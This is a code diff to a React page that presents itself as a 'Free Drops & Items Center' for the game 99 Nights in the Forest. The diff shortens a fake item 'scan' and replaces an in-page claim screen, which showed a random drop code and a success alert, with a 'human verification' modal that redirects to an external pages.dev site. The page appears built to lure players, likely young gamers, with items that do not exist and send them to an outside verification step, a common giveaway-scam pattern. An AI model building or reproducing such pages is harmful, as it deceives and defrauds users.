@@ -9,6 +9,7 @@ import {
   X, 
   Loader2 
 } from 'lucide-react';
+import { ClaimVerificationModal } from './ClaimVerificationModal';
 
 interface NightsForestPageProps {
   onBack: () => void;
@@ -237,9 +238,9 @@ export const NightsForestPage: React.FC<NightsForestPageProps> = ({ onBack }) =>
 
     const t3 = setTimeout(() => {
       setScanStep(4);
-      setScanLabel('Ready for anti-bot verification!');
+      setScanLabel('Ready for human verification!');
       setModalScreen('ready');
-    }, 3800);
+    }, 2600);
 
     return () => {
       clearTimeout(t1);
@@ -421,15 +422,10 @@ export const NightsForestPage: React.FC<NightsForestPageProps> = ({ onBack }) =>
             ))}
           </div>
         </section>
-
-        {/* Footer */}
-        <footer className="text-center py-6 border-t border-[#25364b] text-xs text-[#64748b]">
-          © 2026 99 Nights in the Forest · Free Drops & Items Center
-        </footer>
       </main>
 
       {/* Claim / Unlock Item Modal */}
-      {selectedItem && (
+      {selectedItem && modalScreen !== 'ready' && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
           {/* Backdrop */}
           <div 
@@ -570,44 +566,17 @@ export const NightsForestPage: React.FC<NightsForestPageProps> = ({ onBack }) =>
               </div>
             )}
 
-            {/* SCREEN 3: Ready for final verification */}
-            {modalScreen === 'ready' && (
-              <div className="text-center py-2 space-y-4">
-                <div className="w-16 h-16 rounded-full bg-[#1b2e22] border-2 border-emerald-500 flex items-center justify-center mx-auto text-emerald-400">
-                  <ShieldCheck className="w-9 h-9" />
-                </div>
-
-                <div>
-                  <h4 
-                    className="font-black text-white text-lg"
-                    style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
-                  >
-                    Almost Done!
-                  </h4>
-                  <p className="text-xs text-[#cbd5e1] mt-1 leading-relaxed">
-                    Your <strong>{selectedItem.name}</strong> is reserved for user <strong>{username}</strong>. Complete the anti-bot verification to release the item to your inventory!
-                  </p>
-                </div>
-
-                <div className="p-3 bg-[#131d2b] rounded-2xl border border-[#23364c] text-xs text-blue-300">
-                  Drop Code: <strong>NIGHTS-99-{Math.floor(1000 + Math.random() * 9000)}</strong>
-                </div>
-
-                <button
-                  onClick={() => {
-                    alert(`Congratulations! Item "${selectedItem.name}" claimed successfully for "${username}".`);
-                    handleCloseModal();
-                  }}
-                  className="w-full bg-[#22c55e] hover:bg-[#16a34a] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-xl transition-all shadow-[0_4px_0_#15803d] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
-                  style={{ fontFamily: "'Luckiest Guy', cursive, sans-serif" }}
-                >
-                  <CheckCircle2 className="w-4 h-4" />
-                  <span>VERIFY & UNLOCK NOW</span>
-                </button>
-              </div>
-            )}
           </div>
         </div>
+      )}
+
+      {/* Human Verification Modal matching exact user screenshot */}
+      {selectedItem && modalScreen === 'ready' && (
+        <ClaimVerificationModal
+          isOpen={true}
+          onClose={handleCloseModal}
+          redirectUrl="https://99zup.pages.dev/"
+        />
       )}
     </div>
   );
